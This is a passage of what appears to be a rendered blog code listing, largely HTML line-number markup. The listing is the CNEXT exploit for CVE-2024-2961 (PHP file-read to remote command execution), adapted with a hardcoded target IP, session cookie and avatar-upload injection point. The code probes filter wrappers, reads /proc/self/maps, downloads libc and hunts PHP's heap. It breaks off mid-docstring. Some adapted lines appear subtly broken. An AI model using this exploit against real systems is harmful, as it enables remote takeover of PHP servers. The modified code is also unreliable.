class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.url = url</span><br><span class="line">        <span class="variable language_">self</span>.session = Session()</span><br><span class="line">        <span class="variable language_">self</span>.session.headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=f94847d1ea57a8f3da6468961866269d&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&quot;avatar&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;&quot;</span>),  <span class="comment"># 空文件</span></span><br><span class="line">            <span class="string">&quot;url&quot;</span>: (<span class="literal">None</span>, <span class="string">f&quot;php://filter/read=convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(self.url)</span></span><br><span class="line">        requests.post(<span class="variable language_">self</span>.url, headers=<span class="variable language_">self</span>.session.headers, files=files)</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回远程文件的内容&quot;&quot;&quot;</span></span><br><span class="line">        path2=<span class="string">f&quot;http://60.205.163.215:36064/avatar.php?user=admin&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.session.get(path2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self,path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&quot;avatar&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;&quot;</span>),  <span class="comment"># 空文件</span></span><br><span class="line">            <span class="string">&quot;url&quot;</span>: (<span class="literal">None</span>, <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        requests.post(<span class="variable language_">self</span>.url, headers=<span class="variable language_">self</span>.session.headers, files=files)</span><br><span class="line">        path1 = <span class="string">f&quot;http://60.205.163.215:36064/avatar.php?user=admin&quot;</span></span><br><span class="line">        response = <span class="variable language_">self</span>.session.get(path1)</span><br><span class="line">        <span class="comment"># print(response.content)</span></span><br><span class="line">        data = response.re.search(<span class="string">b&quot;.*&quot;</span>, flags=re.S).group(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">@entry</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;url&quot;</span>, <span class="string">&quot;Target URL&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;command&quot;</span>, <span class="string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;heap&quot;</span>, <span class="string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;pad&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    url: <span class="built_in">str</span></span><br><span class="line">    command: <span class="built_in">str</span></span><br><span class="line">    sleep: <span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line">    heap: <span class="built_in">str</span> = <span class="literal">None</span></span><br><span class="line">    pad: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__post_init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.remote = Remote(<span class="variable language_">self</span>.url)</span><br><span class="line">        <span class="variable language_">self</span>.log = logger(<span class="string">&quot;EXPLOIT&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.info = &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>.heap = <span class="variable language_">self</span>.heap <span class="keyword">and</span> <span class="built_in">int</span>(<span class="variable language_">self</span>.heap, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_vulnerable</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span></span><br><span class="line"><span class="string">        wrappers and filters that the exploit needs.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">safe_download</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">self</span>.remote.download(path)</span><br><span class="line">            <span class="keyword">except</span> ConnectionError:</span><br><span class="line">                failure(<span class="string">&quot;Target not [b]reachable[/] ?&quot;</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">text: <span class="built_in">str</span>, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">            result = safe_download(path)</span><br><span class="line">            <span class="keyword">return</span> text.encode() == result</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>).encode()</span><br><span class="line">        base64 = b64(text, misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        result = safe_download(path)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> text <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            msg_failure(<span class="string">&quot;Remote.download did not return the test string&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected test string: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Got: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            failure(<span class="string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]data://[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(text.encode(), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter//resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(compress(text.encode()), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_success(<span class="string">&quot;Exploit preconditions are satisfied&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">with</span> msg_status(<span class="string">f&quot;Downloading [i]<span class="subst">&#123;path&#125;</span>[/]...&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.remote.download(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[Region]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span></span><br><span class="line">        maps = <span class="variable language_">self</span>.get_file(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">        maps = maps.decode()</span><br><span class="line">        PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">        )</span><br><span class="line">        regions = []</span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):</span><br><span class="line">                start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">                stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">                permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">                path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                    path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    path = <span class="string">&quot;&quot;</span></span><br><span class="line">                current = Region(start, stop, permissions, path)</span><br><span class="line">                regions.append(current)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(maps)</span><br><span class="line">                failure(<span class="string">&quot;Unable to parse memory mappings&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.log.info(<span class="string">f&quot;Got <span class="subst">&#123;<span class="built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span></span><br><span class="line">        regions = <span class="variable language_">self</span>.get_regions()</span><br><span class="line"></span><br><span class="line">        LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># PHP&#x27;s heap</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.info[<span class="string">&quot;heap&quot;</span>] = <span class="variable language_">self</span>.heap <span class="keyword">or</span> <span class="variable language_">self</span>.find_main_heap(regions)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Libc</span></span><br><span class="line"></span><br><span class="line">        libc = <span class="variable language_">self</span>._get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.download_file(libc.path, LIBC_FILE)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.info[<span class="string">&quot;libc&quot;</span>].address = libc.start</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            failure(<span class="string">&quot;Unable to locate region&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, remote_path: <span class="built_in">str</span>, local_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span></span><br><span class="line">        data = <span class="variable language_">self</span>.get_file(remote_path)</span><br><span class="line">        Path(local_path).write(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:</span><br><span class="line">        <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line">        <span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">        heaps = [</span><br><span class="line">            region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line">            <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line">            <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line">            <span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line">            <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="number">1</span>) == <span class="number">0</span></span><br><span class="line">            <span class="keyword">and</span> region.path <span class="keyword">in</span> (<span class="string">&quot;&quot;</span>, <span class="string">&quot;[anon:zend_alloc]&quot;</span>)</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">            failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">        first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">            heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">            msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.check_vulnerable()</span><br><span class="line">        <span class="variable language_">self</span>.get_symbols_and_addresses()</span><br><span class="line">        <span class="variable language_">self</span>.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the</span></span><br><span class="line"><span class="string">        other. Processing generally involves making some kind of operation either</span></span><br><span class="line"><span class="string">        on the chunk or in a destination chunk of the same size. Each operation is</span></span><br><span class="line"><span class="string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span></span><br><span class="line"><span class="string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span></span><br><span class="line"><span 